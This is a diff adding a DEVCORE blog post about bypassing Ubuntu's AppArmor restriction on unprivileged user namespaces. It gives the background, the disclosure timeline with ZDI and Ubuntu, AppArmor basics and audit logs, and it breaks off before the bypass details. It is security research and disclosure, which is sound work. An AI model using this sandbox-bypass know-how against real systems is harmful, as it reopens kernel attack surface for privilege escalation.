@@ -1,0 +1,1238 @@
+
+
+<!DOCTYPE html>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta charset="utf-8" />
+    <link href="/images/favicon.png" rel="icon" size="32x32">
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction | DEVCORE</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <meta name="description" property="og:description" content="Recently, Ubuntu introduced sandbox mechanisms to reduce the attack surface, and they seemed unbreakable. However, after carrying out in-depth research, we found that the implementation contained some issues, and bypassing it was not as difficult as expected. This post will explain how we began our research at the kernel level and discovered a bypass method. We will also share some interesting stories from the process." />
+    <meta name="keywords" content="Ubuntu, AppArmor, user namespace, unprivileged namespace, sandbox bypass, Linux LPE, Ubuntu 24.10, Ubuntu 25.04, AppArmor profile, Linux kernel patch, privilege escalation, ZDI, CVE, unshare, aa_change_profile, Linux sandbox escape, AppArmor bypass, Pwn2Own" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://devco.re/assets/img/blog/20250626/cover.png" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="Recently, Ubuntu introduced sandbox mechanisms to reduce the attack surface, and they seemed unbreakable. However, after carrying out in-depth research, we found that the implementation contained some issues, and bypassing it was not as difficult as expected. This post will explain how we began our research at the kernel level and discovered a bypass method. We will also share some interesting stories from the process.">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20250626/cover.png">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+    <meta property="fb:admins" content="120968921404653" />
+
+    <link rel="canonical" href="https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-GHXJ9PS005');
+    </script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body class="en">
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Services<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/services/red-team/">
+                            <div class="item">
+
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    Red Team Assessment
+                                </h2>
+                                <p class="two-line">
+                                    Simulation of real-world attacks to identify vulnerabilities and achieve objectives without disrupting business operations.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    Penetration Testing
+                                </h2>
+                                <p class="two-line">
+                                    Infiltration of designated enterprise systems to uncover potential vulnerabilities and assess the risks or damages.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    Security Consulting
+                                </h2>
+                                <p class="two-line">
+                                    Consultation of resource distribution and long-term defensive strategies from the attacker’s perspective.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    Security Training
+                                </h2>
+                                <p class="two-line">
+                                    Instruction on defending and preventing incidents with the hacker mindset, also the response procedures and analysis of attacks when incidents happen.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="https://training.devco.re/" target="_blank">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu offsec"></i>
+                                    OffSec Advanced Training <i class="icon open-in-new"></i>
+                                </h2>
+                                <p class="two-line">
+                                    Structured in-person (OffSec Live Training) and online training, featuring up-to-date offensive security skills with OffSec certification and resources.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Research<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    Overview
+                                </h2>
+                                <p class="two-line">
+                                    Research of updated cybersecurity techniques and trends, assess the security of products, and evolve the red team with broad experience.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    Competitions and Awards
+                                </h2>
+                                <p class="two-line">
+                                    Awards from international cybersecurity competitions.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    Enterprise Vulnerability Reports
+                                </h2>
+                                <p class="two-line">
+                                    Research of the risk of enterprise systems, identification of potential weaknesses, and report to vendors.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    International Conferences
+                                </h2>
+                                <p class="two-line">
+                                    Sharing vulnerability research and security knowledge at international cybersecurity conferences.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE List
+                                </h2>
+                                <p class="two-line">
+                                    Discovery of critical vulnerabilities in leading international products and services.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>Company<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                Company Overview
+                            </h2>
+                            <p>
+                                Founded by a world-class white hat hacker team, providing cybersecurity services including Red Team Assessment,  Penetration Testing, Security Consulting, and Security Training.
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/en/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    Team Members
+                                </h2>
+                                <p class="two-line">
+                                    Composed of cybersecurity experts with the hacker mindset, exploring innovative exploitation techniques with high morality and extreme caution.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    Achievements
+                                </h2>
+                                <p class="two-line">
+                                    DEVCORE has been invited to leading cybersecurity conferences, has uncovered hundreds of critical product vulnerabilities, and helped enterprises improve their defensive capabilities.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    Corporate Social Responsibility
+                                </h2>
+                                <p class="two-line">
+                                    We provide diverse internship channels and programs to nurture the next generation and promote cybersecurity awareness.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    Job Opportunities
+                                </h2>
+                                <p class="two-line">
+                                    Join us to secure the world and improve the cybersecurity industry together.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="https://conf.devco.re/" target="_blank">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu conference"></i>
+                                    DEVCORE CONFERENCE <i class="icon open-in-new"></i>
+                                </h2>
+                                <p class="two-line">
+                                    DEVCORE’s annual technical conference focused on offensive security research, red team insights, and novel attack vectors from real-world operations.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>News<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/en/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    Latest news
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    Media Resources
+                                </h2>
+                                <p>
+                                    Media Kit, Logo and Usage Guideline
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/search/">Search</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/contact/">Contact</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>Services</span>
+                <div class="menuItem">
+                    <a href="/en/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                Red Team Assessment
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                Penetration Testing
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                Security Consulting
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                Security Training
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>Research</span>
+                <div class="menuItem">
+                    <a href="/en/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/awards/">
+                        <div class="item">
+                            <h2>Competitions and Awards</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Enterprise Vulnerability Reports</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/talks/">
+                        <div class="item">
+                            <h2>International Conferences</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/cve/">
+                        <div class="item">
+                            <h2>CVE List</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>Company</span>
+                <div class="menuItem">
+                    <a href="/en/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>Company Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/our-team/">
+                        <div class="item">
+                            <h2>Team Members</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/history/">
+                        <div class="item">
+                            <h2>Achievements</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/csr/">
+                        <div class="item">
+                            <h2>Corporate Social Responsibility</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/jobs/">
+                        <div class="item">
+                            <h2>Job Opportunities</h2>
+                        </div>
+                    </a>
+                    <a href="https://conf.devco.re/" target="_blank">
+                        <div class="item">
+                            <h2>DEVCORE CONFERENCE</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>News</span>
+                <div class="menuItem">
+                    <a href="/en/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/en/media-kit/">
+                        <div class="item">
+                            <h2>Media Resources</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/en/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                Search
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                Contact
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/en/blog/">All Articles</a>
+                </li>
+                <li>
+                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
+                </li>
+                <li>
+                    <a href="/en/media-kit/">Media Resources</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
+                    <span class="tag">
+
+                      <a href="/en/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/en/blog/tag/Ubuntu/">#Ubuntu</a> <a href="/en/blog/tag/Advisory/">#Advisory</a> <a href="/en/blog/tag/Linux/">#Linux</a> <a href="/en/blog/tag/Kernel/">#Kernel</a> <a href="/en/blog/tag/AppArmor/">#AppArmor</a> 
+                    </span>
+                    <h1>
+                        The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="avatar">
+                            <a href="/en/blog/author/pumpkin">
+                                <div class="circle">
+                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/pumpkin.png');" ></i>
+                                </div>
+                            </a>
+                        </span>
+                        <span class="author"><a href="/en/blog/author/pumpkin">Pumpkin</a></span>
+                        <span class="date">2025-06-26</span>
+                    </div>
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20250626/cover.png"/>
+                    </div>
+                    
+
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<p><a href="/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/">English Version</a>, <a href="/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/">中文版本</a></p>
+
+<p>Recently, Ubuntu introduced sandbox mechanisms to reduce the attack surface, and they seemed unbreakable. However, after carrying out in-depth research, we found that the implementation contained some issues, and bypassing it was not as difficult as expected. This post will explain how we began our research at the kernel level and discovered a bypass method. We will also share some interesting stories from the process.</p>
+
+<h2 id="1-introduction">1. Introduction</h2>
+
+<h3 id="11-ubuntus-new-sandbox-model">1.1. Ubuntu’s New Sandbox Model</h3>
+
+<p>After years of serving as a rich attack surface for privilege escalation, unprivileged user namespaces finally started receiving serious attention. In April 2024, shortly after that year’s Pwn2Own, Ubuntu published a <a href="https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts">security-focused blog post</a> announcing new mitigations designed to lock down unprivileged namespaces and io_uring. The goal was clear: to ensure that untrusted applications run within a tighter, more controlled sandbox. These restrictions were largely implemented through AppArmor.</p>
+
+<p>Fast forward to September 2024, Ubuntu followed up with a <a href="https://static.sched.com/hosted_files/lsseu2024/ed/Restricting%20Unprivileged%20User%20Namespaces%20In%20Ubuntu.pdf">presentation</a> introducing their sandbox architecture in more depth. The slides outlined not only the motivation behind the design but also provided a breakdown of how the sandbox operates under the hood.</p>
+
+<p><img src="/assets/img/blog/20250626/upload_42ba484ec23b76cbbb9a0d60184bf5d1.png" alt="" /></p>
+
+<p>From these updates, it became evident that Ubuntu’s new model only allows specific applications to create unprivileged namespaces. All other, untrusted processes are blocked. Without access to unprivileged namespaces, attackers lose their entry point to subsystems like netfilter and net/sched — historically fertile ground for discovering vulnerabilities. At first, this seemed like a bulletproof defense. Some researchers even speculated that Ubuntu, formerly the only Linux LPE target at Pwn2Own, might now be effectively unbreakable.</p>
+
+<h3 id="12-emergence-of-the-bypass-method">1.2. Emergence of the Bypass Method</h3>
+
+<p>But then, on February 16, something unexpected happened. I stumbled across a Twitter thread where someone claimed that the new AppArmor-based protections could be bypassed. Seriously? That got my attention.</p>
+
+<p><img src="/assets/img/blog/20250626/upload_aa9dd31f3f5a20bfe166d06729f5544e.png" alt="" /></p>
+
+<p>Coincidentally, Pwn2Own 2025 was just around the corner. It felt like the perfect time to start digging. I decided to analyze how Ubuntu enforces these restrictions via AppArmor — and more importantly, whether there were any cracks in the armor.</p>
+
+<p>To my surprise, it didn’t take long. Within a few hours of reviewing the code, I found a way to bypass them! It wasn’t even particularly difficult to find it, as long as the investigation was conducted in the right direction. With unprivileged namespaces now back on the table, the next step in my plan was straightforward: find a vulnerability in a module of the network subsystem that Ubuntu enables by default but kernelCTF does not. Couldn’t be better!</p>
+
+<p>Unfortunately, things didn’t go so well. Just a week later, on February 24, the official rules for Pwn2Own Berlin were announced, and Ubuntu was off the table because the Linux LPE target was changed to Red Hat Enterprise Linux. To make things worse (for the bypass, at least), RHEL doesn’t restrict unprivileged namespaces at all. Which meant… my bypass was now irrelevant to the competition.</p>
+
+<p><img src="/assets/img/blog/20250626/upload_58836702284ef31386e2d2f737ef8883.png" alt="" /></p>
+
+<h3 id="13-vendor-response">1.3. Vendor Response</h3>
+
+<p>Upon learning that Ubuntu was no longer a Pwn2Own target, I promptly submitted the issue through the ZDI portal, the platform I usually use for vulnerability reporting. But while I waited for a response, the <a href="https://x.com/roddux/status/1903028631514837107">researcher (@roddux)</a> posted a bypass method on Twitter on March 21. Later, on March 27, the Qualys Team released a <a href="https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt">disclosure</a> that included more detailed technical explanations. All of these methods are based on a similar root cause as the one I identified.</p>
+
+<p>As a researcher, it was frustrating to see various bypass methods being publicly disclosed while I couldn’t share my own work because I had already reported it to ZDI. After a few days with no updates, I even emailed ZDI to ask if I could withdraw my submission. Thankfully, my boss, Orange Tsai, stepped in just in time and patiently walked me through the pros and cons of doing so. That helped me regain my composure, and I ended up sending another email to retract my withdrawal request.</p>
+
+<p>On April 27, the ZDI team finally reviewed my report, but they said they were not interested in the issue. So, I decided to report it directly to the Ubuntu Security Team. Within a day, I received a quick response from John, one of the maintainers of the namespace restriction mechanism. He said they were verifying the issue and would notify me of any updates. By the way, this was my first time reporting an issue to the Ubuntu Security Team, and their responsiveness and friendliness made it a great experience to collaborate with them.</p>
+
+<p>After about a month of discussion, they finally determined that the issue I reported was a variant of the bypass methods previously disclosed by the Qualys Team. It only works when <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined</code> is disabled, which has been enabled by default since Ubuntu 25.04. They had also recommended that users disable it in earlier versions through their <a href="https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes">official post</a>.</p>
+
+<p>This post documents my bypass technique and the full disclosure timeline. While the core idea aligns with previously published methods, I believe it is still worth publishing because the method was discovered from a kernel side rather than from userspace. I hope every reader enjoys it!</p>
+
+<h2 id="2-apparmor-101">2. AppArmor 101</h2>
+
+<h3 id="21-overview">2.1. Overview</h3>
+
+<p><strong>AppArmor (Application Armor)</strong> is an implementation of a Linux Security Module (LSM) that provides Mandatory Access Control (MAC), restricting processes’ access to system resources. Administrators can define an AppArmor profile for a program to limit its capabilities. If a process does not have an AppArmor profile, it runs in <strong><code class="language-plaintext highlighter-rouge">unconfined</code> profile</strong>, meaning AppArmor does not impose any restrictions on it.</p>
+
+<p>Each profile defines access control for an individual program, specifying which files, capabilities, and network permissions it can access. Enabled profiles can operate in two modes:</p>
+<ul>
+  <li><strong>Enforced mode</strong>: Violating behavior is blocked and logged.</li>
+  <li><strong>Complain mode</strong>: Violating behavior is only logged but not blocked.</li>
+</ul>
+
+<p>Example profile:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>abi &lt;abi/4.0&gt;,
+include &lt;tunables/global&gt;
+
+profile ipa_verify /usr/bin/ipa_verify flags=(unconfined) {
+  userns,
+
+  # Site-specific additions and overrides. See local/README for details.
+  include if exists &lt;local/ipa_verify&gt;
+}
+</code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">profile ipa_verify</code>: Defines a profile named <code class="language-plaintext highlighter-rouge">ipa_verify</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">/usr/bin/ipa_verify</code>: The profile applies to the binary located at <code class="language-plaintext highlighter-rouge">/usr/bin/ipa_verify</code>. When executed, this profile is automatically loaded.</li>
+  <li><code class="language-plaintext highlighter-rouge">flags=(unconfined)</code>: This profile is in unconfined status. Although the profile is loaded, it does not restrict the application’s behavior.</li>
+  <li><code class="language-plaintext highlighter-rouge">userns</code>: Allows the application to use user namespaces.</li>
+</ul>
+
+<p>Users can use the <code class="language-plaintext highlighter-rouge">aa-status</code> tool to list active profiles and their statuses. Below is an example JSON output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+    "version": "2",
+    "profiles": {
+        "/snap/snapd/23258/usr/lib/snapd/snap-confine": "enforce",
+        "/usr/sbin/sssd": "complain",
+        "Discord": "unconfined"
+    },
+    "processes": {
+        "/usr/sbin/rsyslogd": [
+            {
+                "profile": "rsyslogd",
+                "pid": "1176",
+                "status": "enforce"
+            }
+        ]
+    }
+}
+</code></pre></div></div>
+
+<h3 id="22-behavior-in-ubuntu">2.2. Behavior in Ubuntu</h3>
+
+<p>Users can use the <code class="language-plaintext highlighter-rouge">unshare</code> tool to execute target binary under an unprivileged user namespace. However, after the introduction of new security mechanisms, executing this command on Ubuntu results in an <strong>“Operation not permitted” (-EPERM)</strong> error.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~/<span class="nv">$ </span>unshare <span class="nt">-r</span> <span class="nt">-n</span> <span class="nt">-m</span> /bin/bash
+unshare: write failed /proc/self/uid_map: Operation not permitted
+</code></pre></div></div>
+
+<p>At this point, if we check the kernel log using the <code class="language-plaintext highlighter-rouge">dmesg</code> command, we will see some event logs related to AppArmor.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~/<span class="nv">$ </span><span class="nb">sudo </span>dmesg
+<span class="o">[</span>...]
+<span class="o">[</span>302291.394909] audit: <span class="nb">type</span><span class="o">=</span>1400 audit<span class="o">(</span>1739761091.573:545<span class="o">)</span>: <span class="nv">apparmor</span><span class="o">=</span><span class="s2">"AUDIT"</span> <span class="nv">operation</span><span class="o">=</span><span class="s2">"userns_create"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"namespace"</span> <span class="nv">info</span><span class="o">=</span><span class="s2">"Userns create - transitioning profile"</span> <span class="nv">profile</span><span class="o">=</span><span class="s2">"unconfined"</span> <span class="nv">pid</span><span class="o">=</span>29466 <span class="nb">comm</span><span class="o">=</span><span class="s2">"unshare"</span> <span class="nv">requested</span><span class="o">=</span><span class="s2">"userns_create"</span> <span class="nv">target</span><span class="o">=</span><span class="s2">"unprivileged_userns"</span>
+<span class="o">[</span>302291.395747] audit: <span class="nb">type</span><span class="o">=</span>1400 audit<span class="o">(</span>1739761091.574:546<span class="o">)</span>: <span class="nv">apparmor</span><span class="o">=</span><span class="s2">"DENIED"</span> <span class="nv">operation</span><span class="o">=</span><span class="s2">"capable"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"cap"</span> <span class="nv">profile</span><span class="o">=</span><span class="s2">"unprivileged_userns"</span> <span class="nv">pid</span><span class="o">=</span>29466 <span class="nb">comm</span><span class="o">=</span><span class="s2">"unshare"</span> <span class="nv">capability</span><span class="o">=</span>21  <span class="nv">capname</span><span class="o">=</span><span class="s2">"sys_admin"</span>
+</code></pre></div></div>
+<ol>
+  <li>First AppArmor Event - Audit Event
+    <ul>
+      <li>This event logs execution details.</li>
+      <li>The event describes that a process with PID 29466 (<code class="language-plaintext highlighter-rouge">unshare</code>) attempted to create a user namespace (<code class="language-plaintext highlighter-rouge">operation="userns_create"</code>).</li>
+      <li>The process is currently unrestricted (<code class="language-plaintext highlighter-rouge">profile="unconfined"</code>), meaning it’s not bound to any AppArmor profile at the moment.</li>
+      <li>After this event, the process is assigned the <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> profile.</li>
+    </ul>
+  </li>
+  <li>Second AppArmor Event - Deny Event
+    <ul>
+      <li>This event indicates a denied operation.</li>
+      <li>The <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> profile restricts the process from using the <code class="language-plaintext highlighter-rouge">sys_admin</code> capability.</li>
+      <li>Since unshare requires <code class="language-plaintext highlighter-rouge">sys_admin</code> to create a new user namespace, AppArmor blocks the operation, leading to the <strong>“Operation not permitted (-EPERM)”</strong> error.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>In Ubuntu, all AppArmor profiles are stored in the directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aaa:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /etc/apparmor.d/
+total 528
+drwxr-xr-x   9 root root  4096 Feb 17 10:46 <span class="nb">.</span>
+drwxr-xr-x 141 root root 12288 Feb 16 20:46 ..
+<span class="nt">-rw-r--r--</span>   1 root root   354 Oct  2 07:24 1password
+...
+<span class="nt">-rw-r--r--</span>   1 root root   699 Oct  2 07:24 unprivileged_userns
+...
+</code></pre></div></div>
+
+<p>The file <code class="language-plaintext highlighter-rouge">/etc/apparmor.d/unprivileged_userns</code> defines the <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> profile. Below is part of the file’s content:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+
+profile unprivileged_userns {
+     audit deny capability,
+     audit deny change_profile,
+
+     [...]
+     allow mqueue,
+     allow ptrace,
+     allow userns,
+}
+</code></pre></div></div>
+
+<p>The second event log we saw in the <code class="language-plaintext highlighter-rouge">dmesg</code> output comes from the <code class="language-plaintext highlighter-rouge">audit deny capability</code> rule. This rule blocks all operations that require capabilities such as <code class="language-plaintext highlighter-rouge">CAP_SYS_ADMIN</code>, <code class="language-plaintext highlighter-rouge">CAP_NET_ADMIN</code> and <code class="language-plaintext highlighter-rouge">CAP_CHOWN</code>, and logs any denied requests.</p>
+
+<p>Now that we understand creating a namespace is not allowed under the <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> profile, a key question arises:</p>
+
+<p><strong>Why is our process, which starts in the <code class="language-plaintext highlighter-rouge">unconfined</code> profile, automatically transitioned to the <code class="language-plaintext highlighter-rouge">unprivileged_userns</code> profile?</strong></p>
+
+<p>To answer this, we need to dive into the AppArmor implementation in Ubuntu!</p>
+
+<h2 id="3-investigating-ubuntu-kernel-patch">3. Investigating Ubuntu Kernel Patch</h2>
+
+<h3 id="31-analysis-strategy">3.1. Analysis Strategy</h3>
+
+<p>Each Linux distribution modifies the Linux kernel based on its own needs, and Ubuntu is no exception.</p>
+
+<p>When analyzing the Ubuntu source, you will download two files: the base version of the Linux source code (<code class="language-plaintext highlighter-rouge">linux_&lt;ver&gt;.orig.tar.gz</code>) and a diff file containing Ubuntu’s modifications (<code class="language-plaintext highlighter-rouge">linux_&lt;ver&gt;-&lt;x&gt;.&lt;y&gt;.diff.gz</code>, where x represents Ubuntu’s maintained subversion, and y is usually a minor or patch release). To analyze Ubuntu’s customizations, the patched source code is usually examined alongside the diff file.</p>
+
+<p>However, taking <code class="language-plaintext highlighter-rouge">linux_6.11.0-18.18.diff</code> as an example, the patch contains over 260000 lines - so where should one begin?</p>
+
+<p>We can narrow the direction based on heuristics: the unusual behavior of AppArmor is only triggered by the <strong>unshare operation</strong>. Additionally, <strong>certain strings in the audit event logs</strong> can be searched to quickly locate key operations.</p>
+
+<h3 id="32-diving-into-the-source">3.2. Diving Into the Source</h3>
+
